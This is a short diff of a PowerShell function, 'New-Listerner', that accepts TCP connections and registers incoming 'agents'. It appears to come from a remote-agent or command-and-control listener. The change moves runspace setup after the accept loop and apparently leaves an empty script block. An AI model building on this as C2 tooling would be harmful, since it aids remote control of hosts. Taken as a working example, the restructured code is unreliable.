@@ -46,14 +46,9 @@ Function Global:New-Listerner()
 	# continue accepting socket connections until object no longer exists
 	while(Get-Listerner -UUID ($obj.UUID.toString()))
 	{
-		# build a runspace
-		$Runspace            = [runspacefactory]::CreateRunspace()
-		$PowerShell          = [powershell]::Create()
-		$PowerShell.runspace = $Runspace
-		$Runspace.Open()
-		[void]$PowerShell.AddScript({
 
-			# begin accepting connections
+
+		# begin accepting connections
 			$client          = $listener.AcceptTcpClient()
 			
 			# add agent to listerner
@@ -71,6 +66,18 @@ Function Global:New-Listerner()
 
 			# small sleep to not thrash CPU
 			Start-Sleep -Milliseconds 100
+
+
+
+
+		# build a runspace
+		$Runspace            = [runspacefactory]::CreateRunspace()
+		$PowerShell          = [powershell]::Create()
+		$PowerShell.runspace = $Runspace
+		$Runspace.Open()
+		[void]$PowerShell.AddScript({
+
+			
 		})
 
 		$AsyncObject = $PowerShell.BeginInvoke()
